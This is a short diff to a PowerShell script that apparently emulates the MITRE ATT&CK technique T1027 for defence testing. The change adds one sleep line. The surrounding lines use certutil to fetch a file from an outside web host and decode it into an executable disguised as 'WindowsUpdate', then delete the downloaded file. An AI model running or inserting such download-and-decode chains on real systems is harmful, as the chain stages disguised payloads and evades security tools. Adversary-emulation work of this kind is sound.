@@ -143,6 +143,7 @@ Write-Host "Initiating Defense Evasion - T1027 - Obfuscated Files or Information
 Write-Host "Adversaries may attempt to make an executable or file difficult to discover or analyze by encrypting, encoding, or otherwise obfuscating its contents on the system or in transit. This is common behavior that can be used across different platforms and the network to evade defenses.`n"
 Write-Host "Certutil Download and Decode"
 certutil -urlcache -split -f "http://www.brainjar.com/java/host/test$($n).html" test.txt 
+start-sleep 2
 certutil -decode -f test.txt "WindowsUpdate$($n).exe"
 Start-Sleep 10
 Remove-Item test.txt -Force -ErrorAction Ignore
